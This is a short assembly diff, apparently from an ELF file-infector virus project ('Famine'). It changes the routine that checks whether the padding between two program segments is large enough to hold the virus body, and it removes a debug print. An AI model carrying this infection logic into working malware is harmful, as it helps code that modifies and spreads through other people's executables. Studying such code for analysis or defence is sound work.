@@ -619,13 +619,12 @@ print_rax:
 			test	r11, r11
 			jz		.close_file
 			; check padding size
-			; padding = next_header_off - (curr_header_off + header_size)
-			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next seg
+			; padding = next_header_off - (curr_header_off + header_size)~
+			mov		rax, [rel elfp1 + phdr.p_offset] ; p_offset next
 			mov		rdx, [rel elfp0 + phdr.p_offset] ; p_offset curr seg
 			add		rdx, [rel elfp0 + phdr.p_filesz]
 			sub		rax, rdx
 			; padding < FAMINE_SIZE
-			call	print_rax
 			cmp		rax, FAMINE_SIZE
 			jl		.close_file
 		.skip:
